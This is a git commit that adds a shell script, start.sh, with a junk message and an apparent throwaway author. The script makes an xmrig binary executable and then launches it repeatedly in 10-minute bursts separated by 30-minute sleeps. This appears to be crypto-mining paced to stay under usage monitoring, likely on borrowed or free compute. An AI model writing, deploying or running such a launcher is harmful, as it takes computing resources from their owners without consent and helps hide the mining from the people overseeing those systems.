e7c713147e7110c15ee592f3d33245087e6c0c16
fgkj <hminer1312@vomoto.com>
2021-05-30 13:19:50 +0800

    sdf

---
+++ 1/start.sh
@@ -0,0 +1,203 @@
+chmod u+x xmrig
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+timeout 10m ./xmrig &
+sleep 30m
+
+
